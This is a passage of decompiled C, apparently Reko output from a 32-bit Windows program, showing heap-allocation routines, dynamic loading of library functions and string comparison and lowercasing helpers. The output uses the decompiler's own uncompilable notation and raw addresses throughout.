		(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(edx_145 - 0x04)[ecx_25].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00] = ecx_25 + 0x01;
		word32 ecx_150 = ecx_97->dw0000;
		ecx_97->dw0000 = ecx_150 + 0x01;
		if (ecx_150 == 0x00 && (ebx_142 == globals->t493AD8 && dwLoc08_347 == globals->t493AD0))
			globals->t493AD8 = globals->t493AD8 & 0x00;
		eax_86->t0000 = dwLoc08_347;
		eax_162 = edx_145 + 0x01;
		return eax_162;
	}
	edx_120->ptr0004 = ecx_97->a0004[esi_127].ptr0000;
	struct Eq_10698 * ecx_205 = ecx_97 + esi_127 * 0x02;
	edx_120->ptr0008 = ecx_205;
	ecx_205->ptr0004 = edx_120;
	edx_120->ptr0004->ptr0008 = edx_120;
	if (edx_120->ptr0004 == edx_120->ptr0008)
	{
		byte cl_224 = eax_86[(esi_127 + 0x04) / 0x00C4];
		if (esi_127 < 0x20)
		{
			eax_86[(esi_127 + 0x04) / 0x00C4] = (struct Eq_10580) (cl_224 + 0x01);
			if (cl_224 == 0x00)
				*ebx_142 = *ebx_142 | 0x80000000 >> (byte) esi_127;
			eax_86->a0044[dwLoc08_347] = eax_86->a0044[dwLoc08_347] | 0x80000000 >> (byte) esi_127;
		}
		else
		{
			eax_86[(esi_127 + 0x04) / 0x00C4] = (struct Eq_10580) (cl_224 + 0x01);
			if (cl_224 == 0x00)
				*((word32) ebx_142 + 0x04) = *((word32) ebx_142 + 0x04) | 0x80000000 >> (byte) (esi_127 - 0x20);
			ui32 * edi_255 = eax_86->a00C4 + dwLoc08_347;
			*edi_255 = *edi_255 | 0x80000000 >> (byte) (esi_127 - 0x20);
		}
	}
	goto l0040BBC0;
}

// 0040BC12: Register (ptr Eq_11027) fn0040BC12()
Eq_11027 * fn0040BC12()
{
	struct Eq_11027 * eax_22;
	ui32 eax_114 = globals->dw493ADC;
	ui32 ecx_4 = globals->dw493ACC;
	if (eax_114 == ecx_4)
	{
		Eq_2 eax_106 = HeapReAlloc(globals->t494B04, 0x00, globals->t493AE0, ecx_4 + 0x50 + ecx_4 * 0x04 << 0x02);
		if (eax_106 == 0x00)
		{
l0040BCA5:
			eax_22 = null;
			return eax_22;
		}
		globals->dw493ACC = globals->dw493ACC + 0x10;
		globals->t493AE0 = eax_106;
		eax_114 = globals->dw493ADC;
	}
	struct Eq_11027 * esi_52 = (word32) globals->t493AE0 + (eax_114 * 0x05) * 0x04;
	Eq_2 eax_53 = HeapAlloc(globals->t494B04, 0x08, 0x41C4);
	esi_52->t0010 = eax_53;
	if (eax_53 != 0x00)
	{
		Eq_2 eax_66 = VirtualAlloc(0x00, 0x00100000, 0x2000, 0x04);
		esi_52->t000C = eax_66;
		if (eax_66 != 0x00)
		{
			esi_52->dw0008 = esi_52->dw0008 | ~0x00;
			esi_52->dw0000 = 0x00;
			esi_52->dw0004 = 0x00;
			globals->dw493ADC = globals->dw493ADC + 0x01;
			Eq_2 eax_88 = esi_52->t0010;
			*eax_88 = *eax_88 | ~0x00;
			eax_22 = esi_52;
			return eax_22;
		}
		HeapFree(globals->t494B04, 0x00, esi_52->t0010);
	}
	goto l0040BCA5;
}

// 0040BCC3: Register int32 fn0040BCC3(Stack Eq_2 dwArg04)
int32 fn0040BCC3(Eq_2 dwArg04)
{
	struct Eq_11147 * esi_22 = dwArg04->ptr0010;
	int32 eax_23 = dwArg04->dw0008;
	int32 ebx_25 = 0x00;
	while (eax_23 >= 0x00)
	{
		eax_23 = eax_23 << 0x01;
		ebx_25 = ebx_25 + 0x01;
	}
	word32 edx_46 = 0x3F;
	struct Eq_11160 * eax_48 = esi_22 + (ebx_25 *s 0x0204 + 0x0144) / 0x00C4;
	eax_52 = eax_48;
	do
	{
		struct Eq_11160 * eax_52;
		eax_52[0x01] = (struct Eq_11160) eax_52;
		eax_52->dw0004 = eax_52;
		eax_52 = eax_52 + 0x01;
		edx_46 = edx_46 - 0x01;
	} while (edx_46 != 0x00);
	int32 eax_141;
	Eq_2 edi_65 = (ebx_25 << 0x0F) + dwArg04->dw000C;
	Eq_2 eax_72 = VirtualAlloc(edi_65, 0x8000, 0x1000, 0x04);
	if (eax_72 == 0x00)
		eax_141 = eax_72 | ~0x00;
	else
	{
		if (edi_65 <=u edi_65 + 0x7000)
		{
			word32 eax_147 = edi_65 + 0x10;
			do
			{
				*(eax_147 - 0x08) = *(eax_147 - 0x08) | ~0x00;
				*((word32) eax_147 + 0x0FEC) = *((word32) eax_147 + 0x0FEC) | ~0x00;
				*(eax_147 - 0x04) = 0x0FF0;
				Mem158[eax_147 + 0x00:word32] = eax_147 + 0x0FFC;
				Mem160[eax_147 + 0x04:word32] = eax_147 + ~0x1003;
				*((word32) eax_147 + 0x0FE8) = 0x0FF0;
				eax_147 = eax_147 + 0x1000;
			} while (eax_147 - 0x10 <=u edi_65 + 0x7000);
		}
		Mem114[eax_48 + 0x01FC:word32] = edi_65 + 0x0C;
		*((word32) edi_65 + 0x0014) = eax_48 + 0x003F;
		Mem117[eax_48 + 0x0200:word32] = edi_65 + 0x700C;
		*((word32) edi_65 + 28688) = eax_48 + 0x003F;
		esi_22->a0044[ebx_25] = esi_22->a0044[ebx_25] & 0x00;
		esi_22->a00C4[ebx_25] = 0x01;
		byte al_123 = esi_22->b0043;
		esi_22->b0043 = al_123 + 0x01;
		if (al_123 == 0x00)
			dwArg04->dw0004 = dwArg04->dw0004 | 0x01;
		dwArg04->dw0008 = dwArg04->dw0008 & ~(0x80000000 >> (byte) ebx_25);
		eax_141 = ebx_25;
	}
	return eax_141;
}

// 0040BDBE: Register word32 fn0040BDBE(Stack word32 dwArg04)
word32 fn0040BDBE(word32 dwArg04)
{
	<anonymous> * eax_3 = globals->ptr493ABC;
	if (eax_3 != null)
	{
		word32 * esp_27;
		word32 eax_28;
		byte SZO_29;
		byte C_30;
		byte Z_31;
		word32 ecx_32;
		eax_3();
		if (eax_28 != 0x00)
		{
			*esp_27 = 0x01;
			return *esp_27;
		}
	}
	return 0x00;
}

// 0040C056: Register word32 fn0040C056(Stack word32 dwArg04)
word32 fn0040C056(word32 dwArg04)
{
	return fn0040C067((byte) dwArg04, 0x00, 0x04);
}

// 0040C067: Register ui32 fn0040C067(Stack byte bArg04, Stack word32 dwArg08, Stack byte bArg0C)
ui32 fn0040C067(byte bArg04, word32 dwArg08, byte bArg0C)
{
	struct Eq_11356 * eax_3 = (word32) bArg04;
	if ((eax_3->b494D61 & bArg0C) == 0x00)
	{
		ui32 eax_29;
		if (dwArg08 != 0x00)
			eax_29 = (word32) globals->a412A1A[eax_3 * 0x02] & dwArg08;
		else
			eax_29 = 0x00;
		if (eax_29 == 0x00)
			return eax_29;
	}
	return 0x01;
}

// 0040C098: Register word32 fn0040C098()
word32 fn0040C098()
{
	struct Eq_11381 * esp_103;
	word32 ebx_41 = 0x00;
	if (globals->t493AC0 != 0x00)
	{
l0040C0E7:
		struct Eq_11388 * esp_36 = fp - 0x0C;
		Eq_23 eax_37 = globals->t493AC4;
		if (eax_37 != 0x00)
		{
			word32 ebx_64;
			byte SZO_65;
			byte C_66;
			byte SCZO_67;
			word32 esi_68;
			word32 edi_69;
			byte Z_70;
			word32 eax_71;
			eax_37();
			ebx_41 = eax_71;
			if (eax_71 != 0x00)
			{
				Eq_23 eax_76 = globals->t493AC8;
				if (eax_76 != 0x00)
				{
					*(esp_36 - 0x04) = eax_71;
					word32 ebx_83;
					byte SZO_84;
					byte C_85;
					byte SCZO_86;
					word32 esi_87;
					word32 edi_88;
					byte Z_89;
					word32 eax_90;
					eax_76();
					ebx_41 = eax_90;
				}
			}
		}
		struct Eq_11423 * esp_44 = esp_36 - 0x04;
		esp_44->dw0000 = esp_36->dw0018;
		*(esp_44 - 0x04) = esp_44->dw0018;
		*(esp_44 - 0x08) = esp_44->dw0014;
		*(esp_44 - 0x0C) = ebx_41;
		word32 ebx_55;
		byte SZO_56;
		byte C_57;
		byte SCZO_58;
		word32 esi_59;
		word32 edi_60;
		byte Z_61;
		word32 eax_62;
		globals->t493AC0();
		return esp_103->dw0008;
	}
	else
	{
		Eq_1916 eax_94 = LoadLibraryA(0x0040D614);
		if (eax_94 != null)
		{
			Eq_23 eax_112 = GetProcAddress(eax_94, 0x0040D608);
			globals->t493AC0 = eax_112;
			if (eax_112 != 0x00)
			{
				globals->t493AC4 = GetProcAddress(eax_94, 4249080);
				globals->t493AC8 = GetProcAddress(eax_94, 0x0040D5E4);
				goto l0040C0E7;
			}
		}
		esp_103 = fp - 0x0C;
		return esp_103->dw0008;
	}
}

// 0040C920: Register int32 fn0040C920(Register Eq_4 ecx, Stack Eq_4 dwArg04, Stack ptr32 dwArg08)
int32 fn0040C920(Eq_4 ecx, Eq_4 dwArg04, ptr32 dwArg08)
{
	int32 eax_140;
	byte * esi_136 = dwArg08;
	if (globals->t49393C == 0x00)
	{
		cu8 al_106 = ~0x00;
		byte * edi_49 = dwArg04;
		do
		{
			cu8 al_115 = al_106;
			if (al_106 == 0x00)
				goto l0040C96E;
			al_106 = *esi_136;
			esi_136 = esi_136 + 0x01;
			cu8 ah_85 = *edi_49;
			edi_49 = edi_49 + 0x01;
			if (ah_85 == al_106)
				continue;
			cu8 al_105 = ah_85 - 0x41 + (0x00 - (ah_85 < 0x5B) & 0x20);
			cu8 al_95 = al_106 - 0x41 + (0x00 - (al_106 < 0x5B) & 0x20);
			al_106 = al_105 + 0x41;
		} while (al_105 + 0x41 == al_95 + 0x41);
		cu8 al_112 = 0x00 - (al_105 + 0x41 < al_95 + 0x41);
		al_115 = al_112 - ~0x00 - (al_112 < 0x00);
l0040C96E:
		eax_140 = (int32) al_115;
	}
	else
	{
		word32 eax_118 = 0xFF;
		cu8 al_119 = ~0x00;
		word32 ebx_120 = 0x00;
		byte * edi_123 = dwArg04;
		do
		{
			eax_140 = DPB(eax_182, al_119, 0);
			if (al_119 == 0x00)
				return eax_140;
			al_119 = *esi_136;
			cu8 bl_147 = *edi_123;
			eax_118 = DPB(eax_182, al_119, 0);
			esi_136 = esi_136 + 0x01;
			ebx_120 = DPB(ebx_120, bl_147, 0);
			edi_123 = edi_123 + 0x01;
			word32 eax_182 = eax_118;
			if (al_119 == bl_147)
				continue;
			Eq_4 ecx_160;
			cu8 al_161 = fn00407ACE(ecx, ebx_120, SLICE(ebx_120, byte, 8), SLICE(ebx_120, byte, 16), out ecx_160);
			al_119 = fn00407ACE(ecx_160, eax_118, SLICE(eax_118, byte, 8), SLICE(eax_118, byte, 16), out ecx);
			ebx_120 = DPB(eax_182, al_161, 0);
			eax_118 = DPB(eax_182, al_119, 0);
		} while (al_161 == al_119);
		uint32 eax_175 = 0x00 - (al_161 < al_119);
		eax_140 = eax_175 - ~0x00 - (eax_175 < 0x00);
	}
	return eax_140;
}

// 0040C9AC: void fn0040C9AC(Register ptr32 ebp, Stack Eq_4 dwArg04)
void fn0040C9AC(ptr32 ebp, Eq_4 dwArg04)
{
	Eq_4 eax_10 = globals->t49393C;
	Eq_4 dwLoc08_118 = 0x00;
	if (eax_10 == 0x00)
	{
		byte * edx_50 = dwArg04;
		if (*dwArg04 != 0x00)
		{
			do
			{
				ci8 cl_74 = *edx_50;
				if (cl_74 >= 0x41 && cl_74 <= 0x5A)
					*edx_50 = cl_74 + 0x20;
				edx_50 = edx_50 + 0x01;
			} while (*edx_50 != 0x00);
		}
	}
	else
	{
		word32 ecx_111;
		Eq_4 eax_112 = fn00408A01(fp - 0x04, eax_10, (byte *) 0x0100, 0x01, dwArg04, ~0x00, 0x00, 0x00, 0x00, 0x01, out ecx_111);
		if (eax_112 != 0x00)
		{
			Eq_4 eax_141 = fn00409613(eax_112);
			dwLoc08_118 = eax_141;
			if (eax_141 != 0x00)
			{
				*(fp - 0x18) = 0x01;
				*(fp - 0x1C) = 0x00;
				*(fp - 0x20) = (union Eq_4 *) eax_112;
				*(fp - 0x24) = (union Eq_4 *) eax_141;
				*(fp - 0x28) = ~0x00;
				*(fp - 44) = (byte **) dwArg04;
				*(fp - 0x30) = 0x0100;
				*(fp - 0x34) = (union Eq_4 *) globals->t49393C;
				word32 ecx_172;
				if (fn00408A01(fp - 0x04, dwArg00, dwArg04, bArg05, dwArg08, dwArg0C, dwArg10, dwArg14, dwArg18, dwArg1C, out ecx_172) != 0x00)
				{
					*(fp - 0x18) = (union Eq_4 *) eax_141;
					*(fp - 0x1C) = (byte **) dwArg04;
					fn00407750(dwArg00);
				}
			}
		}
		*(fp - 0x18) = (union Eq_4 *) dwLoc08_118;
		word32 ebp_128;
		word32 edi_129;
		fn004095E4(fp - 0x04, dwArg00, out ebp_128, out edi_129);
	}
	return;
}

